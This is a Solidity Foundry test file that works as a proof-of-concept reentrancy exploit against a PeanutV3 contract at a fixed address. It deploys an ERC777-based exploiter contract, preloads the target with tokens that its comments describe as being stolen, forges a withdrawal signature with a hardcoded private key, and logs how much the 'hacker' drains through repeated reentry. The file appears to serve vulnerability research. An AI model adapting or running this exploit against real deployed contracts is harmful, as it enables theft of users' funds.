// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/PeanutV3.sol";

import "../src/ECDSA.sol";
// import "../src/ExploiterEther.sol";
import "../src/ExploiterERC777.sol";

import "../src/Token.sol";

import {IERC1820Registry} from  "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

contract DummyERC777TokensRecipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        // Do nothing
    }
}

contract NutcrackerTest is Test, DummyERC777TokensRecipient {
    PeanutV3 peanutV3;

    IERC1820Registry private constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    uint256 SIGNER_PRIVATE_KEY = 0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6;
    address SIGNER_ADDRESS = 0xa0Ee7A142d267C1f36714E4a8F75612F20a79720;

    Token public token;
    uint256 public totalTokens = 10;

    function setUp() public {
        peanutV3 = PeanutV3(0xdB60C736A30C41D9df0081057Eae73C3eb119895);

        // Ability to receive ERC777 tokens
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));

        address[] memory defaultOperators = new address[](1);
        defaultOperators[0] = address(this);
        token = new Token("Token", "TKN", defaultOperators, totalTokens);
    }

    function testReentrancy() public {
        uint8 _contractType = 1; // ERC20
        uint256 _amount = 1;
        uint256 _tokenId = 0; // ignored when _contractType == 0
        address _pubKey20 = SIGNER_ADDRESS;

        // Setup Exploiter
        ExploiterERC777 exploiter = new ExploiterERC777(peanutV3);
        address hacker = address(exploiter);

        // Signature
        bytes32 hash = ECDSA.toEthSignedMessageHash(abi.encodePacked(keccak256(abi.encodePacked(hacker))));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_PRIVATE_KEY, hash);
        bytes memory signature = abi.encodePacked(r, s, v);
        emit log_bytes(signature);        

        // Preload PeanutV3 with assets
        // These assets are the one being stolen by the hacker
        token.transfer(address(peanutV3), totalTokens - 1);

        // Deposit assets
        token.approve(address(peanutV3), _amount);
        uint256 depositId = peanutV3.makeDeposit(
            address(token),
            _contractType,
            _amount,
            _tokenId,
            SIGNER_ADDRESS
        );

        emit log_named_uint("Deposit id", depositId);
        uint256 initialBalance = token.balanceOf(hacker);
        emit log_named_uint("Hacker balance before exploit", initialBalance);

        // Set exploit parameters
        exploiter.setParams(
            depositId,
            ECDSA.toEthSignedMessageHash(abi.encodePacked(keccak256(abi.encodePacked(hacker)))),
            signature,
            totalTokens - 1
        );

        // Withdraw
        peanutV3.withdrawDeposit(
            depositId, 
            hacker, 
            ECDSA.toEthSignedMessageHash(abi.encodePacked(keccak256(abi.encodePacked(hacker)))),
            signature
        );

        emit log_named_uint("Hacker balance after exploit", token.balanceOf(hacker));
        emit log_named_uint("Hacker withdrew", token.balanceOf(hacker) - initialBalance);
        emit log_named_uint("Hacker reenter count", exploiter.reentrancyCount());
    }
}
